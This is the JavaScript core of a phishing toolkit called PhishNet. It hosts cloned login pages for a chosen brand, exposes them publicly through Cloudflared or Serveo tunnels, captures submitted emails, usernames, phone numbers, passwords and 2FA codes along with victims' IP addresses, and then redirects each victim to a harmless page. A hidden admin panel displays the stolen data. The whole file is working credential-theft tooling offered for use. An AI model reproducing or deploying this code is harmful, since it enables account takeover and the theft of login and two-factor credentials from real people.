// Developer: Sreeraj
// GitHub: https://github.com/s-r-e-e-r-a-j

import express from 'express';
import fs from 'fs-extra';
import path from 'path';
import bodyParser from 'body-parser';
import chalk from 'chalk';
import inquirer from 'inquirer';
import os from 'os';
import { CONFIG } from '../config/index.js';
import { utils } from '../utils/index.js';
import { CloudflaredHandler } from '../handlers/cloudflared.js';
import { ServeoHandler } from '../handlers/serveo.js';
import { AdminPanel } from '../panels/admin.js';

export class PhishNetEngine {
    constructor() {
        this.cf = new CloudflaredHandler();
        this.sv = new ServeoHandler();
        this.app = express();
        this.server = null;
        this.port = CONFIG.port;
        this.site = null;
        this.tunnel = null;
        this.endpoints = [];
        this.projectName = null;
    }

    async init() {
        console.clear();
        console.log(chalk.cyan(`PhishNet v${CONFIG.version} Advanced Phishing Engine`));
        
        if (os.platform() !== 'linux') {
            console.log(chalk.red('Linux required'));
            process.exit(1);
        }
        
        await utils.installDeps();
        
        const online = await utils.checkInternet();
        if (!online) {
            console.log(chalk.red('No internet connection'));
            process.exit(1);
        }
    }

    async selectTunnel() {
        const { tunnel } = await inquirer.prompt([{
            type: 'list',
            name: 'tunnel',
            message: 'Select tunnel method:',
            choices: [
                { name: 'Localhost (No Tunnel)', value: 'local' },
                { name: 'Cloudflared', value: 'cf' },
                { name: 'Serveo.net', value: 'sv' }
            ]
        }]);
        this.tunnel = tunnel;
    }

    async setupProject() {
        const { action } = await inquirer.prompt([{
            type: 'list',
            name: 'action',
            message: 'Project setup:',
            choices: [
                { name: 'Create new project', value: 'new' },
                { name: 'Load existing project', value: 'load' },
                { name: 'List projects', value: 'list' }
            ]
        }]);

        if (action === 'list') {
            const projects = this.listProjects();
            if (projects.length === 0) {
                console.log(chalk.yellow('No projects found'));
                return this.setupProject();
            }
            
            console.log(chalk.cyan('\nAvailable projects:'));
            projects.forEach(p => console.log(`  ${p}`));
            
            return this.setupProject();
        }

        if (action === 'load') {
            const projects = this.listProjects();
            if (projects.length === 0) {
                console.log(chalk.yellow('No projects to load'));
                return this.setupProject();
            }

            const { project } = await inquirer.prompt([{
                type: 'list',
                name: 'project',
                message: 'Select project:',
                choices: projects
            }]);

            const config = this.loadProject(project);
            this.site = config.site;
            this.port = config.port;
            this.endpoints = config.endpoints;
            this.redirect = config.redirect || 'https://google.com';
            this.projectName = project;
            
            console.log(chalk.green(`Loaded project: ${project}`));
            console.log(chalk.gray(`   Site: ${config.site}`));
            console.log(chalk.gray(`   Endpoints: ${config.endpoints.join(', ')}`));
            console.log(chalk.gray(`   Redirect: ${config.redirect}`));
            console.log(chalk.gray(`   Port: ${config.port}`));
            return;
        }

        const { name, site, endpoints, redirect } = await inquirer.prompt([
            {
                type: 'input',
                name: 'name',
                message: 'Project name:',
                validate: n => /^[a-z0-9-]+$/.test(n)
            },
            {
                type: 'input',
                name: 'site',
                message: 'Site name (e.g., facebook):',
                validate: s => s.length > 0
            },
            {
                type: 'input',
                name: 'endpoints',
                message: 'Endpoints (comma separated, e.g., /login,/auth) [default: /login]:',
                default: '/login'
            },
            {
                type: 'input',
                name: 'redirect',
                message: 'Redirect URL after capture:',
                default: 'https://google.com',
                validate: url => /^https?:\/\//.test(url) || 'Enter a valid URL'
            }
        ]);

        this.site = site;
        this.projectName = name;
        this.endpoints = endpoints.split(',').map(e => e.trim());
        this.redirect = redirect;
        const sitePath = path.join(CONFIG.paths.sites, this.projectName);
        await fs.ensureDir(sitePath);
        await fs.ensureDir(path.join(sitePath, 'css'));
        await fs.ensureDir(path.join(sitePath, 'js'));
        await fs.ensureDir(path.join(sitePath, 'img'));

        const config = {
            name,
            site,
            endpoints: this.endpoints,
            redirect,
            port: this.port,
            created: Date.now()
        };
        
        await fs.writeFile(
            path.join(sitePath, 'config.json'),
            JSON.stringify(config, null, 2)
        );

        console.log(chalk.green(`Created project: ${name}`));
    }

    listProjects() {
        const sitesDir = CONFIG.paths.sites;
        if (!fs.existsSync(sitesDir)) return [];
        
        return fs.readdirSync(sitesDir)
            .filter(f => {
                const configPath = path.join(sitesDir, f, 'config.json');
                return fs.existsSync(configPath);
            });
    }

    loadProject(name) {
        const configPath = path.join(CONFIG.paths.sites, name, 'config.json');
        return JSON.parse(fs.readFileSync(configPath, 'utf8'));
    }

    async selectPort() {
        const { custom } = await inquirer.prompt([{
            type: 'confirm',
            name: 'custom',
            message: 'Use custom port?',
            default: false
        }]);

        if (custom) {
            while (true) {
                const { port } = await inquirer.prompt([{
                    type: 'number',
                    name: 'port',
                    message: 'Port (1024-9999):',
                    validate: p => p >= 1024 && p <= 9999
                }]);

                const available = await utils.checkPort(port);
                if (available) {
                    this.port = port;
                    break;
                } else {
                    console.log(chalk.red(`Port ${port} is in use`));
                }
            }
        }
    }

    setupServer() {
        this.app.use(utils.filter);
        this.app.use(utils.fakeHeaders);
        this.app.use(bodyParser.urlencoded({ extended: true }));
        this.app.use(bodyParser.json());

        
        const adminPath = '/admin-' + CONFIG.adminToken;
        new AdminPanel(this.app, CONFIG.paths.data, adminPath);

        
        this.app.get('/analytics.js', (req, res) => {
            res.setHeader('Content-Type', 'application/javascript');
            res.send('console.log("PhishNet tracker loaded");');
        });

        this.app.get('/pixel.gif', (req, res) => {
            const px = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
            res.writeHead(200, {
                'Content-Type': 'image/gif',
                'Content-Length': px.length,
                'Cache-Control': 'no-cache'
            });
            res.end(px);
        });

        
        const endpoints = this.endpoints && this.endpoints.length > 0 ? 
            this.endpoints : 
            ['/login', '/auth', '/signin', '/login.php', '/auth.php'];

        endpoints.forEach(endpoint => {
            this.app.post(endpoint, async (req, res) => {
                const data = req.body;
                const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
                
                const { normalized, type } = utils.normalizeFields(data);
                
                const captureData = {
                    type,
                    fields: normalized,
                    raw: data,
                    userAgent: req.headers['user-agent']
                };
                
                await utils.logData(type, captureData, ip, this.site, endpoint);
                
                console.log(chalk.yellow(`\n[+] ${this.site.toUpperCase()} capture from ${ip}`));
                if (normalized.email) console.log(chalk.white(`    Email: ${normalized.email}`));
                if (normalized.username) console.log(chalk.white(`    Username: ${normalized.username}`));
                if (normalized.phone) console.log(chalk.white(`    Phone: ${normalized.phone}`));
                if (normalized.password) console.log(chalk.white(`    Password: ${'*'.repeat(Math.min(normalized.password.length, 10))}`));
                if (normalized.otp) console.log(chalk.white(`    2FA: ${normalized.otp}`));
                
                const redirectUrl = this.redirect || 'https://google.com';
                res.redirect(redirectUrl);
            });
        });

        
        this.app.use('/css', express.static(path.join(CONFIG.paths.sites, this.projectName || this.site, 'css')));
        this.app.use('/js', express.static(path.join(CONFIG.paths.sites, this.projectName || this.site, 'js')));
        this.app.use('/img', express.static(path.join(CONFIG.paths.sites, this.projectName || this.site, 'img')));

        
        this.app.get('*', (req, res) => {
            
            if (req.path.startsWith('/admin-')) {
                return res.status(404).send('Not found');
            }
            
            const projectPath = path.join(CONFIG.paths.sites, this.projectName || this.site);
            const filePath = path.join(projectPath, req.path);
            
            if (fs.existsSync(filePath) && fs.statSync(filePath).isFile()) {
                res.sendFile(filePath);
            } else {
                const indexPath = path.join(projectPath, 'index.html');
                if (fs.existsSync(indexPath)) {
                    res.sendFile(indexPath);
                } else {
                    res.status(404).send('Not found');
                }
            }
        });

        
        this.app.get('/favicon.ico', (req, res) => {
            res.status(204).end();
        });

        
        this.app.use('*', (req, res) => {
            
            if (req.path.startsWith('/admin-')) {
                return res.status(404).send('Not found');
            }
            
            res.status(404).send(`
                <!DOCTYPE html>
                <html>
                <head><title>404</title></head>
                <body style="font-family:sans-serif;text-align:center;padding:50px">
                    <h1>404</h1>
                    <p>Not found</p>
                </body>
                </html>
            `);
        });
    }

    async start() {
        return new Promise((resolve, reject) => {
            try {
                this.server = this.app.listen(this.port, '0.0.0.0', () => {
                    console.log(chalk.green(`\n[+] Server running on port ${this.port}`));
                    resolve();
                });
            } catch (e) {
                reject(e);
            }
        });
    }

    async showInfo() {
        if (this.tunnel !== 'local') {
           console.log(chalk.gray('\n[i] Starting tunnel...'));
        }
        
        try {
            let url;
            
            if (this.tunnel === 'cf') {
                await this.cf.install();
                url = await this.cf.start(this.port);
            } 
            else if (this.tunnel === 'sv') {
                url = await this.sv.start(this.port);
            } else {
                   url = `http://localhost:${this.port}`;
            }

            if (this.tunnel === 'local') {
               console.log(chalk.green('[+] Running on localhost\n'));
               console.log(chalk.cyan('   Local URL:'), `http://localhost:${this.port}`);
            } else {
                console.log(chalk.green('[+] Tunnel active\n'));
                console.log(chalk.cyan('   Public URL:'), url);
                console.log(chalk.cyan('   Local URL:'), `http://localhost:${this.port}`);
            }
            
            const adminPath = '/admin-' + CONFIG.adminToken;
            console.log(chalk.yellow('\n[!] Admin Panel:'));
            console.log(chalk.white(`   URL:  http://localhost:${this.port}${adminPath}`));
            console.log(chalk.white(`   User: ${CONFIG.adminUser}`));
            console.log(chalk.white(`   Pass: ${CONFIG.adminPass}`));
            console.log(chalk.gray('\n[i] Press Ctrl+C to stop\n'));

        } catch (e) {
            console.log(chalk.red('[!] Tunnel failed:'), e.message);
        }
    }

    async run() {
        await this.init();
        await this.setupProject();
        await this.selectTunnel();
        
        console.log(chalk.gray(`\n[i] Setting up ${this.site}...`));
        
        this.setupServer();
        await this.selectPort();
        await this.start();
        await this.showInfo();

        await new Promise(() => {});
    }

    cleanup() {
        console.log(chalk.gray('\n[i] Shutting down...'));
        if (this.cf) this.cf.stop();
        if (this.sv) this.sv.stop();
        if (this.server) this.server.close();
        process.exit(0);
    }
}
